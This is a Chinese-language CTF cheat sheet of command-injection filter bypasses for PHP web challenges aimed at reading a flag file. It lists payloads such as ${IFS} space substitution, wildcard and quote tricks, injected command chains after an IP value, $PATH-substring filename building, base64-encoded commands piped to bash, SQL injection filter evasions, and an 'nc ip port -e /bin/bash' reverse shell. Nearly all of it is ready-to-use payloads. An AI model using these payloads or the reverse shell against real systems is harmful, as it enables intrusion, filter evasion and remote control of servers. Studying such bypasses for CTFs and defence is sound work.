1.查看类命令替代
cat
tail--看文件末尾，对一些比较长的文件才有显著效果
sort--排序并输出内容
tac 反向显示，从最后一行开始往前显示
head
nl 会显示行号
more 一页一页显示文件内容
less 与more类似
od（od -t d1 tmp flag） 以二进制方式读取文件内容
rev（rev/ flag | rev）
2.flag字段的替代
f*:匹配所有f开头的文件  这里也可以用*尝试匹配所有文件
fla?:匹配所有flax，x代表任意字符
fla[f-h]:匹配flaf，flag，flah
fla{f,g.h}:匹配flaf，flag，flah
f''lag = f""lag = flag
fla'g'=flag
3.preg__match 匹配单行正则表达式
4.空格绕过
(正则表达式中用\s匹配空字符)
 1 ${IFS}或$IFS$9或%09可以代替空格  cat${IFS}/flag
   2. 你可以使用命令替代短命令来获取flag。例如：   如果目标服务器允许访问`/proc`文件系统，你可以尝试以下命令：  
   cat</flag
5.命令拼接绕过
127.0.0.1;b=ag;a=fl;cat$IFS$9$a$b.php
6.反斜杠\绕过
当cat，ls被过滤时，可用\绕过，还可以绕过对flag等的过滤，如fl\ag
l\s  c\at
 \特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令  
7.重定向(可以用于无回显的rce)
.>重定向操作符
将命令的输出发送到指定的文件
cat /flag > 1.txt

- 如果`1.txt`文件之前不存在，它将被创建，并包含`/flag`文件的内容。
- 如果`1.txt`文件已经存在，它的内容将被`/flag`文件的内容覆盖8.tee命令
作用与重定向符基本一致，但 tee可以把一份数据同时写入多个文件，而>>或>只能把一份数据写入到一个文件中；  可以在>这个符号被过滤时使用
9.无回显RCE，
如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可
ls / | tee 1.txt
cat /flag | tee 2.txt
//eval()无输出
eval(print(`c\at /flag`);)
10.环境变量
  echo $PATH              #PATH默认系统环境变量
 如果出现：
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
echo f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}h${PATH:93:1}表示了flag.php
11.SQL注入绕过
用/**/绕过空格（%09）
like绕过空格过滤
还有双写绕过，大小写过滤绕过
#注释绕过 %23
and绕过  &&
12.show_source可以用show.source或者show[source绕过
13.无回显反弹shell
在网页参数中执行nc 目标机的ip  端口   -e /bin/bash
在主机中进行端口监听 nc -lvp 端口
14.编码绕过
  （1）base64,32编码绕过
 cat flag.php--> Y2FOIGZSYWcucGhwecho Y2FOIGZsYWcucGhw | base64 -d管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令  

```python
echo Y2FOIGZsYWcucGhw | base64 -d | bash
 $(echo Y2FOIGZsYWcucGhw | base64 -d)
`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号，使用反引号不需要使用sh
将base64解码后的命令通过管道符传递给bash
这里的bash若被过滤可以考虑用sh来执行
```
  （2）hex哈希编码

```python
echo -n "content" | xxd -r -p  字符串转成十六进制
echo -n "62626262626278" | xxd -r -p 十六进制转成字符串
```
​
15.命令执行函数区别
system 有回显
passthru 有回显
exec 无回显，输出命令执行结果的最后一行
shell_exec 无回显
``  反引号，与shell_exec作用一致
反引号等同于命令执行函数
 
